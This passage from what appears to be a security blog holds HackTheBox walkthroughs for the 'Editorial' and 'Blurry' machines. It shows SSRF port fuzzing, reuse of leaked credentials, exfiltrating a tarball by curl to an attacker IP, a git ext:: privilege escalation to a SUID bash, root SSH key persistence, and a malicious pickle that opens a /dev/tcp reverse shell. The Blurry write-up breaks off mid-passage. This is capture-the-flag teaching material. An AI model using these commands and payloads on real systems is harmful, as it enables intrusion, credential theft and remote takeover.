TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA) |_ 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://editorial.htb Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results from the vuln scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 68/udp open|filtered tcpwrapped 500/udp open|filtered isakmp 626/udp open|filtered serialnumberd 996/udp open|filtered tcpwrapped 3456/udp open|filtered tcpwrapped 5353/udp open|filtered zeroconf 31337/udp open|filtered BackOrifice 32769/udp open|filtered filenet-rpc 49190/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Wait, BackOrifice?? It would be crazy if that was actually on the target - it&rsquo;s pretty much the original RAT.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=editorial.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v Alright, that&rsquo;s the expected result. Nothing else though. Now I&rsquo;ll check for subdomains of editorial.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll now try spidering http://editorial.htb using ZAP:
The /upload page seems particularly interesting - worth checking out next &#x1f6a9;
In case there are some pages not linked-to, I&rsquo;ll do directory enumeration on http://editorial.htb
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-root -of json -timeout 4 -v Directory enumeration against http://editorial.htb only led to the results already obtained when spidering the site with ZAP.
Exploring the Website The website appears to be a place for aspiring authors to self-publish. The /about page shows an email address (submissions@tiempoarriba.htb) which may hint at an alternate domain.
&#x1f4ac; ​Tiempo Arriba is Spanish, and translates to &ldquo;time up&rdquo; in English
The Publish with us navbar item links to /upload has contents that look like one form, but is actually composed of two separate forms. The first form is for performing a POST request that uploads a resource as the &ldquo;cover&rdquo; of of your book. The form submits via an xhr request when the Preview button is clicked:
This is the javascript it uses for the Preview button:
document.getElementById(&#39;button-cover&#39;).addEventListener(&#39;click&#39;, function(e) { e.preventDefault(); var formData = new FormData(document.getElementById(&#39;form-cover&#39;)); var xhr = new XMLHttpRequest(); xhr.open(&#39;POST&#39;, &#39;/upload-cover&#39;); xhr.onload = function() { if (xhr.status === 200) { var imgUrl = xhr.responseText; console.log(imgUrl); document.getElementById(&#39;bookcover&#39;).src = imgUrl; document.getElementById(&#39;bookfile&#39;).value = &#39;&#39;; document.getElementById(&#39;bookurl&#39;).value = &#39;&#39;; } }; xhr.send(formData); }); I should investigate this later for some SSRF &#x1f6a9;
The second form is for submitting some textual data about the book, and some contact info. The submit button is at the bottom:
FOOTHOLD Cover URL SSRF What kind of Cover URLs are possible to submit? First, I&rsquo;ll try starting up an HTTP server and requesting resources from it:
sudo ufw allow from $RADDR to any port 8000 proto tcp cd www cp ~/Pictures/beaver.jpg . simple-server 8000 -v It happily requests an image from my http server:
We can see from the server log that the target is using python requests user agent:
Localhost bypasses What I&rsquo;d really like to do with this is load some internal resources - things that I don&rsquo;t currently have access to from the HTTP server; i.e.a classic SSRF. Attempts to load resources from http://localhost did not work. I&rsquo;ll try some common bypasses (in case it&rsquo;s a poorly written deny-list preventing us from accessing it):
\`\`https://localhost\` http://127.0.0.1 http://127.000.000.001 http://127.1 http://2130706433 http://017700000001 HtTp://LoCaLhOsT http://0.0.0.0 http%3A%2F%2127.0.0.1 For more detail, please see the short checklist I wrote on SSRF. Disclaimer: it&rsquo;s still a work in progress!
No luck with any of those, though.
Redirection to localhost Another way to bypass filters for localhost is by getting the SSRFable component to access an external resource (which we&rsquo;ve already proven it can do), but then have the external resource redirect back to localhost. To test this, I&rsquo;ll add another image, bird.png, and host a php file called redirect.php:
&lt;?php if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;GET&#39;) { $url = &#39;http://10.10.14.12:8000/bird.jpg&#39;; header(&#34;Location: $url&#34;, true, 302); #header(&#34;Location: $url&#34;, true, 200); exit; } else { http_response_code(405); echo &#34;Method not allowed&#34;; } ?&gt; cp ~/Pictures/bird.jpg . php -S 0.0.0.0:8000 When I provide the form with a URL of http://10.10.14.12:8000/redirect.php, it does not redirect to bird.jpg - this indicates that python requests is being used in a manner that ignores redirects.
I could also attempt to define some javascript that would perform the redirection, but this would be pointless. Python requests would not load the javascript, so this would definitely not work.
Enumerating localhost ports So far I haven&rsquo;t been able to reach localhost via HTTP on port 80 - but what about other ports? First, I&rsquo;ll make one request, and proxy it through ZAP. Within ZAP, I&rsquo;ll save the request as a .raw file. Then, simply modify the file to have a fuzzable keyword (I&rsquo;m using PORT) within the request; here is ssrf_port.raw:
POST http://editorial.htb/upload-cover HTTP/1.1 host: editorial.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: */* Accept-Language: en-US,en;q=0.5 Content-Type: multipart/form-data; boundary=---------------------------185675169266113044496348590 content-length: 351 Origin: http://editorial.htb DNT: 1 Connection: keep-alive Referer: http://editorial.htb/upload Sec-GPC: 1 -----------------------------185675169266113044496348590 Content-Disposition: form-data; name=&#34;bookurl&#34; http://127.0.0.1:PORT -----------------------------185675169266113044496348590 Content-Disposition: form-data; name=&#34;bookfile&#34;; filename=&#34;&#34; Content-Type: application/octet-stream -----------------------------185675169266113044496348590-- I&rsquo;ll try to fuzz the port number using ffuf. To prepare for this, I&rsquo;ll generate a list of all possible port numbers:
seq 1 65535 &gt; port_numbers.txt Then, run ffuf, providing the wordlist and the raw request file. Initial attemps indicated out that the responses 61B long are &ldquo;negative&rdquo; results, so filter them out:
ffuf -w port_numbers.txt:PORT -request ssrf_port.raw -c -v -fs 61 Within a minute or two, we see a result appear. Submitting the form with http://localhost:5000 as the Cover URL results in an actual uploaded file:
static/uploads/76cfc7d3-36c6-42ea-9994-487367432900
(as opposed to /static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg, which seems to indicate that the requested resources is not present)
That&rsquo;s curious. Since this link is stored in the image src, I&rsquo;ll open the image in a new tab to download the resulting file. Since the contents appear to be JSON, I&rsquo;ll open it in the browser:
It&rsquo;s an API description! Fantastic. We see there is an API running at /api/latest, and that there&rsquo;s also a changelog. That means there&rsquo;s probably multiple versions running?
To interact with the API a little more comfortably, I wrote the following python script. I&rsquo;m also proxying the connection through ZAP, for better logging:
import requests import io import json from simplejson.errors import JSONDecodeError class colors: RED = &#39;\\033[91m&#39; GREEN = &#39;\\033[92m&#39; YELLOW = &#39;\\033[93m&#39; BLUE = &#39;\\033[94m&#39; MAGENTA = &#39;\\033[95m&#39; CYAN = &#39;\\033[96m&#39; END = &#39;\\033[0m&#39; url = &#34;http://editorial.htb&#34; proxies = { &#39;http&#39;: &#39;http://localhost:8080&#39;, &#39;https&#39;: &#39;http://localhost:8080&#39; } try: while True: resource = input(&#34;Enter the resouce to request through http://localhost:5000\\n(or press Ctrl+C to exit): &#34;) # Create an empty BytesIO object to simulate the empty file book_file = io.BytesIO() # create a dict for the content dispositions files = { &#39;bookurl&#39;: (None, f&#39;http://localhost:5000{resource}&#39;), &#39;bookfile&#39;: (&#39;&#39;, book_file, &#39;application/octet-stream&#39;) } # Send the POST request response = requests.post(f&#39;{url}/upload-cover&#39;, files=files, proxies=proxies) uuid = response.text # Check if the response is a UUID if response.status_code != 200 or not response.text.startswith(&#39;static/uploads&#39;): print(f&#39;{colors.RED}SSRF requested invalid resource. The response was:\\nHTTP {response.status_code}\\n{response.text}\\n{colors.END}&#39;) continue # Request the resource at the provided UUID response = requests.get(f&#39;{url}/{uuid}&#39;, proxies=proxies) try: # Attempt to parse the response as JSON then pretty-print it json_data = response.json() pretty_json = json.dumps(json_data, indent=4) print(f&#39;{colors.BLUE}\\n{pretty_json}{colors.END}&#39;) except JSONDecodeError: # Returned data was not JSON print(f&#39;{colors.BLUE}\\n{response.text}{colors.END}&#39;) except KeyboardInterrupt: print(&#34;\\nScript terminated by the user.&#34;) Given the JSON description of the API we got from http://localhost:5000/, I&rsquo;ll try each endpoint and see what&rsquo;s there:
API (latest) /api/latest/metadata/messages/promos No response
/api/latest/metadata/messages/coupons /api/latest/metadata/messages/authors There&rsquo;s a credential in there! dev : dev080217_devAPI!@
/api/latest/metadata/messages/how_to_use_platform No response
/api/latest/metadata/changelog OK, so there are versions v1, v1.1, v1.2, and v2.
/api/latest/metadata No response
I don&rsquo;t know of any &ldquo;internal forum and authors site&rdquo; yet, so I&rsquo;ll try the credentials I found with SSH and hope for credential re-use:
ssh dev@$RADDR # password: dev080217_devAPI!@ Fantastic! We now have an SSH connection.
USER FLAG Grab the flag &#x1f34d; The SSH connection drops us into /home/dev, adjacent to the user flag. Simply cat it out for the points:
cat user.txt ROOT FLAG Local enumeration - dev I&rsquo;ll follow my usual Linux User Enumeration strategy. To keep this walkthrough as brief as possible, I&rsquo;ll omit the actual procedure of user enumeration, and instead just jot down any meaningful results:
There are three users with terminal access, dev, prod, and root. Port 5000 is the only other TCP port listening (well, also DNS) dev can&rsquo;t sudo anything dev can only write to their home directory, which conspiculously contains a directory called apps that has a .git inside (but no other contents &#x1f632; ). This is definitely something to investigate later &#x1f6a9; Some useful tools the target has include: nc, netcat, curl, wget, python3, perl, tmux apps directory It seems suspicious to have a .git directory present when there is no other data or code around.
Thankfully, I have free access to this directory, so I&rsquo;ll just examine it on my attacker machine instead of the target. I&rsquo;ll do the file transfer by uploading it to an HTTP server. First, set up the HTTP server:
&#x1f447; I&rsquo;m using one of my own tools for this, http-simple-server. It also handles file uploads nicely, but is also useful for exfiltration by base64-encoded data. Check it out if you want.
sudo ufw allow from $RADDR to any port 8000 proto tcp cd loot simple-server 8000 -v Then, on the target machine, I&rsquo;ll archive the directory and upload it
cd ~ tar -czvf apps.tar.gz apps curl -X POST -F &#39;file=@apps.tar.gz&#39; http://10.10.14.12:8000 Back on my attacker machine, I&rsquo;ll decompress:
tar -zxvf apps.tar.gz There&rsquo;s a tool called Githacker that attempts to reconstruct a git repo from only its .git directory. I used it when solving a previous HTB box, Pilgrimage. Usually, you use it against a website that accidentally exposed their .git. It doesn&rsquo;t seem to work when trying to use it locally:
mkdir ../apps_git_output githacker --url file:///home/kali/Box_Notes/Editorial/loot/apps/ \\ --output-folder /home/kali/Box_Notes/Editorial/loot/apps_git_output # No connection adapters were found for &#39;file:///home/kali/Box_Notes/Editorial/loot/apps/.git/HEAD&#39; I don&rsquo;t think it likes the file:// URL scheme. I&rsquo;ll close down my http server and run it from this directory instead:
[Ctrl+C] cd ../loot/apps/ python3 -m http.server 8000 &amp; githacker --url http://localhost:8000/ --output-folder /home/kali/Box_Notes/Editorial/loot/apps_git_output Seems successful. It looks like the git repo contains both the website running on port 80, and the API running on port 5000:
I checked the directory quickly for creds using trufflehog, but it didn&rsquo;t find anything. Trufflhog is neat, but it often misses things, so I&rsquo;ll enumerate manually anyway.
Dev code Taking a look through these files, I can tell it&rsquo;s definitely not the same version as what the target is currently running. In fact, it appears to be one version ahead of what&rsquo;s in production already. While the API we already saw was at version 2, this one seems to be at version 2.3:
// ... &#39;2.3&#39;: { &#39;editorial&#39;: api_editorial_name, &#39;contact_email&#39;: api_editorial_email, &#39;api_route&#39;: f&#39;{api_route}/&#39; } // ... if __name__ == &#39;__main__&#39;: app.run(host=&#39;127.0.0.1&#39;, port=5001, debug=True) We can compare this to the code that the target is running, which is present in the /opt directory:
Very interesting that clone_changes is in the prod group. Perhaps it&rsquo;s a hint for later? &#x1f6a9;
The discernible differences are between the live code (version 2) and the code in the /home directory (version 2.3) are:
The &ldquo;authors&rdquo; message that we gained credentials from earlier is now at GET /api/latest/metadata/authors/message The coupons are gone, so is the API description - now it just has the changelog and the &ldquo;authors&rdquo; message. It&rsquo;s configured to run at http://127.0.0.1:5001 instead It uses debug=True That&rsquo;s cool -but by itself, it doesn&rsquo;t help me at all. There must be something else missing. Since we have the .git directory here, it probably makes sense to take a look at the repo&rsquo;s commit history.
Commit history Thankfully, there is a perfect tool for checking out commit history using just a .git directory, called tig.
It&rsquo;s like doing git diff on every commit, but has a really nice interface - highly recommend it. You can obtain it from the github repo here.
I first used this tool when I solved Intentions, and was very happy with the results!
After transferring the /home/dev/apps directory to my attacker machine, I simply entered the directory and used tig:
cd loot/apps tig The latest unstaged changes are a big mess of updated bootstrap code. But the previous one, &ldquo;change(api): downgrading prod to dev&rdquo;, shows something juicy:
Scrolling the bottom pane to the right a little, we see what that line changed from:
&#x1f609; They left some creds for prod in plaintext: prod : 080217_Producti0n_2023!@
Knowing that prod is a user with a login, we&rsquo;ll once again check for credential re-use and try these with SSH:
ssh prod@$RADDR # password: 080217_Producti0n_2023!@ Success! &#x1f44f;
Local enumeration - prod Since we already have a password, the first thing I checked is if prod has any sudo access. Indeed, they do:
# User prod may run the following commands on editorial: # (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py * Nice, there&rsquo;s that clone_changes directory again. I had a feeling that would be important.
The clone_prod_change.py script is pretty short:
#!/usr/bin/python3 import os import sys from git import Repo os.chdir(&#39;/opt/internal_apps/clone_changes&#39;) url_to_clone = sys.argv[1] r = Repo.init(&#39;&#39;, bare=True) r.clone_from(url_to_clone, &#39;new_changes&#39;, multi_options=[&#34;-c protocol.ext.allow=always&#34;]) It seems like you provide it a URL and it will clone the git repo into the new_changes directory. But what&rsquo;s this multi_options configuration?
Research I did some searching about it. The official documentation indicates that the -c option is used for setting any configuration that you could normally put in a git config. I eventually found a section referring to this configuration variable, but even then it fails to describe what the &ldquo;ext&rdquo; protocol would be.
Unstatisfied with what I found in the official documentation, I searched for protocol.ext.allow and found that this can actually be used for privesc:
Check out this SuperUser StackExchange answer Check out this article from Snyk that shows how the option can be abused for privesc, labelling this as CVE-2022-24439. &#x1f632; The Snyk article even generously provides a PoC script:
from git import Repo r = Repo.init(&#39;&#39;, bare=True) r.clone_from(&#39;ext::sh -c touch% /tmp/pwned&#39;, &#39;tmp&#39;, multi_options=[&#34;-c protocol.ext.allow=always&#34;]) Execution So basically, I just need to supply the script a URL with some kind of privesc payload. I&rsquo;ll try an SUID bash:
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &#39;ext::sh -c cp% /usr/bin/bash% /tmp/test&#39; While the output shown indicates an error occured, we can see that it actually succeeded:
Great. Now let&rsquo;s use the same trick to make it SUID:
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &#39;ext::sh -c chmod% u+s% /tmp/test&#39; Again, it looks like an error occurred, but it was actually successful:
Perfect - now we&rsquo;ll just excalate privileges using that SUID bash:
/tmp/test -p And there it is &#x1f609; Just read the flag to finish off the box:
cat /root/root.txt EXTRA CREDIT SSH as root I noticed that root has an .ssh directory. So let&rsquo;s add a key, in case we want to let ourselves back in easily without having to repeat privesc.
First, I&rsquo;ll generate a keypair:
ssh-keygen -t rsa -b 4096 # saved as:	./id_rsa # passphrase:	tuc4n chmod 600 ./id_rsa base64 -w 0 id_rsa.pub # Copy result to clipboard Then, using the root shell, add the public key into /root/.ssh/authorized_keys:
echo -n &#39;c3NoL...thbGkK&#39; | base64 -d &gt;&gt; /root/.ssh/authorized_keys Now we can freely login as root:
ssh -i ./id_rsa root@$RADDR # passphrase: tuc4n CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm /tmp/test rm -rf /tmp/.Tools I also checked ps -faux and cleaned up all of the backgrounded processes I left running.
Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm loot/apps.tar.gz It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x2611;&#xfe0f; Use a checklist with SSRF. When I initially discovered the SSRF opportunity on this box, I became overly-fixated on finding a bypass for the &ldquo;localhost&rdquo; filter. Even though it should be one of the first things you check with an SSRF, it took me long to move onto port enumeration. The solution is to have a checklist in front of you. I find that when I have other options at my fingertips, I follow a much more sane methodology of try each thing, and only when that fails try harder at each thing.
&#x1f4dc; Got Git? Check commit history. I&rsquo;m going to have to start making a more formal procedure for what to do when I encounter a git repo on a box. Very near the top of the list should be checking commit history. On this box, I checked git diff, but by default that only examines the latest commit. I should get in the habbit of using tig early and often.
Defender &#x1f6ae; Only use disposable credentials when coding. Everyone makes mistakes. I&rsquo;m guilty of this too: accidentally leaving credentials inside git repos. To lessen the consequences when an accident does happen, be sure to always use some throwaway credentials while you&rsquo;re coding. To be clear, this provides no added security - it only makes the consequences of disclosing those credentials less severe. You should always prevent credentials from entering a git repo in the first place: an easy way to do this is by using an .env file, and adding .env to your .gitignore.
&#x1f47d; Be careful with strange git options. In Editorial, we abused the protocol.ext.allow option of a git clone to use the ext protocol to privesc. Why was that option included in the script in the first place? If we&rsquo;re pretending this is a real scenario, that option would only ever be included due to laziness - it defaults to being disabled for a very good reason.
`,url:"https://4wayhandshake.github.io/walkthrough/editorial/"},"https://4wayhandshake.github.io/walkthrough/blurry/":{title:"Blurry",tags:["ClearML","Insecure File Upload","API Abuse","Race Condition","Insecure Coding","Pickle","Fickler","Bad File Permissions"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION Blurry was released as the eighth box in HTB&rsquo;s Season V, Anomalies. This box is all about attacking an AI/ML platform called ClearML. ClearML is a system for orchestrating various AI/ML platforms, running models and experiments on a remote server. It has an extensive Python API, which we use repeatedly while solving this box. This box is on the easier side of &ldquo;medium&rdquo;, but was still a reasonable challenge.
This box only has http and ssh, so recon is very straightforward, comprising of little more than just a subdomain scan. You don&rsquo;t even need to do any directory enumeration. You&rsquo;ll discover a few subdomains, all of which are related to ClearML. One of them only provides a hint, but the other two are used in foothold.
Achieving a foothold took a few tries and a little creativity, but all of the information you need is already documented by a blog that disclosed the relevant CVEs. I didn&rsquo;t find any PoC code, so it&rsquo;s likely you&rsquo;ll have to write it yourself. The code shown in the blog post is very useful, but is not enough to get you all the way to a foothold - read very carefully the pitfalls the authors experienced, and you&rsquo;ll have a better idea of how to exploit Blurry for a foothold.
The user flag is available right after gaining foothold, but the root flag is where your journey could take two paths. A little bit of local enumeration leads you two an important script on the box. One way (likely unintended by the author of the box) is very easy: it&rsquo;s a misconfiguration you may have encountered when doing the &ldquo;Starting Point&rdquo; path on HTB. The other way takes a little fiddling, but isn&rsquo;t too tough either: very careful code analysis will reveal some insecurely-written logic in a sudo-able script.
All in all, this was a fantastic box. Highly recommend it!
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) | ssh-hostkey: | 3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA) | 256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA) |_ 256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519) 80/tcp open http nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to http://app.blurry.htb/ Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results from the vuln scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR No results from scanning the top 100 UDP ports.
Webserver Strategy Noting the redirect from the nmap scan, I added app.blurry.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=blurry.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts echo &#34;$RADDR app.$DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://app.blurry.htb &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No result there. I&rsquo;ll assume that the only domain is blurry.htb. Now I&rsquo;ll check for subdomains of blurry.htb - maybe it&rsquo;s not only app.blurry.htb?
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v Aha! There are at least two additional subdomains. I&rsquo;ll add them to /etc/hosts before continuing:
echo &#34;$RADDR files.$DOMAIN&#34; | sudo tee -a /etc/hosts echo &#34;$RADDR chat.$DOMAIN&#34; | sudo tee -a /etc/hosts I&rsquo;ll move on to directory enumeration on app.blurry.htb, chat.blurry.htb and files.blurry.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34;; ffuf -w $WLIST:FUZZ -u http://files.$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-files -of json -e .php,.html,.txt -timeout 1 -v; No results there. What about chat?
ffuf -w $WLIST:FUZZ -u http://chat.$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-chat -of json -e .php,.html,.txt -timeout 1 -v; Nothing important. And app?
ffuf -w $WLIST:FUZZ -u http://app.$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-app -of json -e .php,.html,.txt -timeout 1 -v; The results were only directories that can be easily found by traversing/spidering the website.
Exploring the Website The subdomain from the original http redirect shows a simple logon page for ClearML. Just enter a name to proceed:
This leads to the ClearML web app, which has many features:
The dashboard shows a couple of recent projects. I&rsquo;ll investigate more after checking the other two subdomains.
The chat.blurry.htb subdomain shows some kind of chat web app, with a window title of Blurry Vision.
I registered an account using the credentials jimbob : password123 and logged in. There&rsquo;s one message notification waiting for me. Checking it out, I see that there is a prior conversation that my new user has just entered:
The DevOps platform that irisview is referring to might be ClearML itself. It&rsquo;s also good to see that jippity is tagged as an Admin.
Vulnerability Research ClearML Since the name &ldquo;ClearML&rdquo; fits quite nicely with the name of the box, I decided to begin my search for vulnerabilities (or any prior works) with that. Thankfully, not too much searching led to a very helpful article written by a team that found six zero-days in ClearML!
https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/
They included a handy video for each vulnerability. The one below even shows quite clearly that the files.blurry.htb subdomain is the fileserver (that usually runs on port 8081) and is vulnerable to an LFI:
On that same post, there is an even more powerful technique shown: uploading a malicious pickle and having the target deserialize it. If all goes according to plan, this might be a way to get RCE quite easily:
I&rsquo;ll investigate this method after I finish researching the web services running on the target &#x1f6a9;
Rocket Chat There is a HackTricks page on how to abuse Rocket Chat to lead to RCE. However, it requires setting up an webhook, something that it seems my low-priv jimbob user lacks access to.
It seems that there is also an exploit for CVE-2021-22911 that involves NoSQL injection to gain an administrator&rsquo;s auth token. It says this exploit will work for Rocket Chat 3.12.1 - so what version are we using? It doesn&rsquo;t seem to say anywhere in the UI.
Thankfully, a reply in the Rocket Chat github repo Issues shows that it&rsquo;s possible to find the version by checking http://chat.blurry.htb/api/info:
I.e. the exploit for CVE-2021-22911 will not be useful here.
FOOTHOLD ClearML Pickle Deserialization If I&rsquo;m not mistaken, I should be able to use two of the techniques shown on the article mentioned above - combining CVE-2024-24592 (&ldquo;Improper Auth Leading to Arbitrary Read-Write Access&rdquo;) with CVE-2024-24590 (&ldquo;Pickle Load on Artifact Get&rdquo;) to achieve RCE.
Here&rsquo;s an overview of the steps:
Start a reverse shell listener Locate the Task ID of of some task I want to utilize (or create my own?) Write a Python class with a malicious __reduce__() function. Create an object from that class and pickle it into a file. Utilize CVE-2024-24592 to upload the pickle as an artifact to the target Task. Attempt to access the pickle, thus utlizing CVE-2024-24590 to execute the payload (reverse shell?) Let&rsquo;s prepare for this attack scenario. First, I&rsquo;ll prepare the reverse shell listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp ip a s tun0 # (My address is 10.10.14.12) bash nc -lvnp 4444 Next, prepare a python venv and install clearml:
cd exploit python3 -m venv . source bin/activate pip3 install clearml Now write a malicious class and pickle it. pickleme.py:
import os, pickle class RunCommand(): def __reduce__(self): return (os.system, (&#34;bash -c &#39;sh -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1&#39;&#34;,)) command = RunCommand() with open(&#39;revshell.pkl&#39;, &#39;wb&#39;) as f: pickle.dump(command, f) python3 pickleme.py This successfully created the malicious pickle, written into revshell.pkl. Now I&rsquo;ll need to upload this pickle as an artifact. According to the docs, I&rsquo;ll need to locate a valid Task ID. I&rsquo;ll do this by perusing through the experiments of the &ldquo;Black Swan&rdquo; project.
To upload the pickle, I&rsquo;ll use the clearml python API again:
from clearml import Task target_task = &#39;fa54c922dd4d449494c5c00192819e88&#39; task = Task.get_task(task_id=target_task) task.upload_artifact(name=&#39;pickle_artifact&#39;, artifact_object=&#39;revshell.pkl&#39;, retries=2, wait_on_upload=True, extension_name=&#39;.pkl&#39;) python3 upload_artifact.py As expected, this didn&rsquo;t work - how would my attacker box know where to upload the artifact to?
Initializing ClearML clearml.backend_api.session.defs.MissingConfigError: It seems ClearML is not configured on this machine! To get started with ClearML, setup your own 'clearml-server' or create a free account at https://app.clear.ml Setup instructions can be found here: https://clear.ml/docs
Thankfully, the documentation it links to actually has some helpful instructions on initializing our connection to the ClearML server:
clearml-init This runs a wizard for configuring ClearML locally. It first asks us to generate some credentials, which are available through the web app (app.blurry.htb) via the user&rsquo;s Settings &gt; Workspace then generating new credentials:
api { web_server: http://app.blurry.htb api_server: http://api.blurry.htb files_server: http://files.blurry.htb credentials { &#34;access_key&#34; = &#34;CAY3C2MLVYI6XK719N9E&#34; &#34;secret_key&#34; = &#34;4pk2Tg1BzdDAggz39FCeT5c73cbHB0L0SbQn6osQChTewLCcxI&#34; } } This configuration references api.blurry.htb - did I miss a subdomain?
Oof! I did miss that subdomain &#x1f62c; I&rsquo;ll at that to /etc/hosts and initialize ClearML:
echo &#34;$RADDR api.$DOMAIN&#34; | sudo tee -a /etc/hosts clearml-init Perfect. It seems like it initialized properly.
Uploading an artifact Now let&rsquo;s try that upload script again:
Hmm&hellip; I guess it failed because the task I&rsquo;m using already has the published status? A little more reading of the blog disclosing these CVEs let me know that they actually didn&rsquo;t upload to an existing task - they instead made a new one:
When we first tried to exploit this, we realized that using the upload_artifact method, as seen in Figure 5, will wrap the location of the uploaded pickle file in another pickle. Upon discovering this, we created a script that would interface directly with the API to create a task and upload our malicious pickle in place of the file path pickle.
They say to upload the &ldquo;malicious pickle in place of the file path pickle&rdquo;. I suppose that means I shouldn&rsquo;t save the pickle into a file, I should instead just upload it directly. I&rsquo;ll modifiy upload.artifact.py accordingly - basically to merge my two scripts into one:
